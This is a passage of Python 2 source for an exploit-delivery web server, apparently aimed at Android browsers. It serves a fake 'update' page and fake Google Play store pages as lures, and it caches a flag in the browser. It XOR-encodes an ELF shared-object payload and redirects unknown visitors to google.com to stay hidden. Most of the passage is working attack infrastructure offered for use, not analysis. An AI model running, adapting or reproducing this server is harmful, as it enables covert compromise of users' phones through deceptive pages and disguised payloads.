                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(update_page)
                LOG['ask_update_time'] = time.ctime()

                current_exploit.update_html_served = True
                

            # flag written in browser cache, same for each exploit
            elif re.match('^/fetch_update.cfm$', path) != None: 
                                
                logging.debug('Sending fetch_update page')
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write( Exploit.generate_fetch_update_page() )
                LOG['cache_key_time'] = time.ctime()
                

            # requests common to all the in_target browsers

            elif path == '/fp.png':
                data = open('fp.png', 'r').read()
                logging.debug('Sending fp.png')
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(data)
                
            elif path == '/js_lib.js':
                data = open('tea_compressed.js', 'r').read()
                logging.debug('Sending tea_compressed.js')
                self.send_response(200)
                self.send_header('Content-type', 'application/javascript')
                self.end_headers()
                self.wfile.write(data)
            


            # Start fake play store pages

            elif path == '/play_css_ltr.css':
                data = open('play/play_css_ltr.css').read()
                self.send_response(200)
                self.send_header('Content-type', 'text/css')
                self.end_headers()
                self.wfile.write(data)

            elif path == '/play_logo.png':
                data = open('play/play_logo.png').read()
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(data)
                
            elif path == '/app-header-stripes.gif':
                data = open('play/app-header-stripes.gif').read()
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')
                self.end_headers()
                self.wfile.write(data)
                
            elif path == '/icon.png':
                data = open('play/icon.png').read()
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(data)

            elif path == '/bg.jpg':
                data = open('play/bg.jpg').read()
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(data)

            elif path == '/chart.png':
                data = open('play/chart.png').read()
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(data)

            elif path == '/screenshot_1.png':
                data = open('play/screenshot_1.png').read()
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(data)
            # End fake play store pages


            else:
                logging.debug('Wrong path {}'.format(path))
                self.send_initial_redirect()
                return



 

    
    def send_initial_redirect(self):
        self.send_response(302)
        self.send_header("Location", 'http://google.com')
        self.end_headers()
        
        logging.debug('Initial Redirect: {}'.format(time.ctime()) )
        LOG['initial_redirect_time'] = time.ctime()
        
    


    def send_empty_reply(self):
        self.send_response(200)
        self.end_headers()
        
        redirect_page = '''

function s_avea_messi_dinanzi_da_la_fronte() {
  document.location = "https://play.google.com/store";
}

'''

        self.wfile.write(redirect_page)
        logging.debug('Empty reply: {}'.format(time.ctime()) )
        LOG['empty_reply_time'] = time.ctime()


        exploit.bail()
        exploit.report()



# utility methods
def xor(payload, xor_key):

    file_size = 0

    out = ''

    key = int(xor_key, 16)
    key = struct.unpack("<I", struct.pack(">I", key))[0]

    with open(payload, 'rb') as data:

        for block in iter(lambda: data.read(4), ""):

            if len(block) == 4:
                result = struct.unpack('>I', block)[0] ^ key
                out += struct.pack('>I',result)

                file_size += 4

            # last block
            else:
                file_size += len(block)

                key_tuple = struct.unpack("<BBBB", struct.pack('>I', key))

                block_fmt = 'B' * len(block)
                block_tuple = struct.unpack('>' + block_fmt, block)

                i=3
                j=0
                for c in block_tuple:
                    out += struct.pack('>B', c ^ key_tuple[j]) 
                    i-=1
                    j+=1

    return out, file_size


def xor_buffer(payload, xor_key):

    out = []
    key = [int(xor_key[i:i+2],16) for i in range(0, len(xor_key)-1, 2)]
    
    i = 0
    while( i < len(payload) ):

        block = payload[i:i+4]
    
        block[0] ^= key[3]
        block[1] ^= key[2]
        block[2] ^= key[1]
        block[3] ^= key[0]
        
        out[i:i+4] = block

        i+=4
    
    return out

def fmt_short(short):
    return '\u' + hex(socket.ntohs(int(short)))[2:]


# end of utility methods

def usage(script_name):
    print 'usage {} server_ip server_port shared_object key_01234567'.format(script_name)
    print '\te.g. {} 192.168.69.131 80 shared_object 91234569'.format(script_name)
  


if __name__ == '__main__':


    LOG['command_line'] = ' '.join(sys.argv[:])
    
   
    # a] parameters validation
    # try:
    #     # 1] server ip
    #     if len(sys.argv) != 5:
    #         raise Exception('Not enough arguments')


    #     octects = sys.argv[1].split('.')
    #     if not ( len(octects) == 4 and all(0 <= int(o) < 256 for o in octects)):
    #         raise Exception('Wrong server ip')


    #     # TODO: check an interface with such ip actually exists

    #     server_ip           = sys.argv[1]

    #     # 2] server port 
    #     if( int(sys.argv[2]) < 0 or int(sys.argv[2]) > 65535 ):
    #         raise Exception('Invalid port number')
    #     server_port         = sys.argv[2]
        

    #     # 3] shared object
    #     try:
    #         # TODO: might want to check that there's an export called 'start'
    #         fd = open(sys.argv[3])
    #         fd.seek(1)
    #         if fd.read(3) != 'ELF':
    #             raise Exception('File {} is not an ELF binary'.format(sys.argv[3]))

    #     except IOError:
    #         raise Exception('Shared object "{}" not found'.format(sys.argv[3]))

    #     shared_object       = sys.argv[3]


    #     # 4] xor key
    #     int(sys.argv[4])
    #     if len(sys.argv[4]) != 8:
    #         raise Exception('Wrong XOR key {}'.format(sys.argv[4]))

    #     xor_key = sys.argv[4]


            
    # except Exception , e:
    #     logging.critical(e)
    #     usage(sys.argv[0])
    #     sys.exit(1);


    # # b] parameters validated, launch exploit

    # final_executable, file_size = xor(shared_object, xor_key)

    # exploit = Exploit( server_ip,
    #                    server_port,
    #                    xor_key,
    #                    file_size,
    #                    final_executable,
    #                    None )

    #exploit.launch()

    httpServer = BaseHTTPServer.HTTPServer( ('', 80), ExploitHTTPHandler )
    httpServer.serve_forever()
    logging.info('Starting HTTP server on port {}'.format(self.server_port))
